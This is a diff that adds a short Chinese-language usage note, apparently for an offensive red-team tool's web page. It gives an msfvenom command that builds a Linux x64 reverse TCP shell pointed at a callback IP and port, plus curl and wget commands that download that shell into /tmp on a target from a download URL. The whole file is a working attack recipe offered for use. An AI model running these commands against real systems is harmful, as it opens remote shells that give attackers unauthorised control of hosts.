@@ -1,0 +1,7 @@
+msf生成nc可接收的反向shell，端口为页面右上角的回连端口（可修改），建议每次使用先执行第一条命令覆盖原有shell（因为回连ip会变）
+>重新生成反向shell，覆盖原有shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$callback_ip LPORT=$callback_port -f elf-so -o $toolfile
+>curl下载shell的命令
+cd /tmp && curl $downloadurl -O
+>wget下载shell的命令
+cd /tmp && wget $downloadurl
